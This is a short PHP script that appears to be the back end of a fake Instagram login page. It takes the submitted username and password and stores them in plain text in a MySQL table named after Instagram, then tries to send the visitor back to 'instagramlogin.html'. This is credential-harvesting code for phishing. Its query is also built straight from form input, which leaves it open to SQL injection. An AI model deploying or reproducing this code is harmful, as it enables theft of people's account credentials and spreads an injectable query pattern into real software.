<?php


$con = mysqli_connect('localhost','root');

if($con){
    echo "Connection Sucessful";
}else{
    echo "No Connection";
}

mysqli_select_db($con, 'mycontactusforms');

$username = $_POST['username'];
$password = $_POST['password'];

$query = " insert into instagram057235 (username, password)
values ('$username', '$password') ";

mysqli_query($con, $query);

header('instagramlogin.html')

?>